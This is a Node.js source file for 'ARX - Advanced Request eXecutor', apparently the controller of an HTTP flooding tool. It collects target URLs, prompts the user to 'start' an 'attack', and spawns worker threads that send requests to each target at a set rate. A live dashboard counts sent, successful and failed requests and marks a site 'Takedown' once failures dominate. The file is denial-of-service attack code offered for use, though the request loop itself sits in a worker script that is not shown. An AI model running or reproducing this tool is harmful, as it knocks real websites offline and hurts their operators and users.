const readline = require("readline");
const { Worker } = require("worker_threads");
const os = require("os");
const http = require("http");
const https = require("https");
const chalk = require("chalk");

console.clear();
console.log(chalk.greenBright.bold("Selamat datang di ARX - Advanced Request eXecutor [AutoScale]"));

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

let targets = [];
let stats = {};
let workers = {};
let status = {};
let lastStats = {};

function askURL(index = 0) {
  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async (url) => {
    if (!url.trim()) {
      if (targets.length === 0) return askURL(index);
      return askCommand();
    }
    const live = await checkLive(url.trim());
    targets.push(url.trim());
    stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
    status[url.trim()] = live ? "Alive" : "Takedown";
    workers[url.trim()] = [];
    askURL(index + 1);
  });
}

function askCommand() {
  rl.question('Type "start" to begin attack: ', (input) => {
    if (input.trim().toLowerCase() === "start") start();
    else askCommand();
  });
}

function checkLive(url) {
  return new Promise((resolve) => {
    const lib = url.startsWith("https") ? https : http;
    const req = lib.get(url, { timeout: 5000 }, (res) => {
      res.resume();
      resolve(true);
    });
    req.on("error", () => resolve(false));
    req.on("timeout", () => {
      req.destroy();
      resolve(false);
    });
  });
}

function start() {
  console.clear();
  console.log(chalk.redBright.bold("⚔ ARX - Advanced Request eXecutor ⚔"));
  console.log(chalk.gray("By: Akashirohman and team\n"));

  targets.forEach((url, index) => {
    let thread = 2;
    let rps = 20;

    for (let i = 0; i < thread; i++) {
      spawnWorker(url, rps);
    }
  });

  displayStats();
  listenCommand();
}

function spawnWorker(url, rps) {
  const worker = new Worker("./worker.js", {
    workerData: { target: url, rps },
  });

  worker.on("message", (msg) => {
    if (msg.type === "stats") {
      stats[url].sent += msg.sent;
      stats[url].success += msg.success;
      stats[url].failed += msg.failed;

      if (status[url] === "Alive" && stats[url].failed > stats[url].success * 2) {
        status[url] = "Takedown";
      }
    }

    if (msg.type === "error") {
      console.error(chalk.red(`[ERROR] ${url}: ${msg.error}`));
    }
  });

  workers[url].push(worker);
}

function displayStats() {
  setInterval(() => {
    console.clear();
    console.log(chalk.redBright.bold("⚔ ARX - Advanced Request eXecutor ⚔"));
    console.log(chalk.gray("By: Akashirohman and team\n"));

    targets.forEach((url, i) => {
      const s = stats[url];
      const statusText = status[url] === "Alive" ? chalk.green("Alive") : chalk.red("Takedown");
      console.log(`[Target ${i + 1}] ${url} | ${statusText}`);
      console.log(`Sent: ${chalk.yellow(s.sent)} | Success: ${chalk.green(s.success)} | Failed: ${chalk.red(s.failed)}\n`);
    });

    console.log("Command (stop): ");
  }, 1000);
}

function listenCommand() {
  rl.on("line", (line) => {
    if (line.trim().toLowerCase() === "stop") {
      targets.forEach((url) => {
        workers[url].forEach((w) => w.terminate());
      });
      console.log(chalk.redBright("\n[STOPPED] All targets terminated."));
      process.exit(0);
    }
  });
}

askURL();
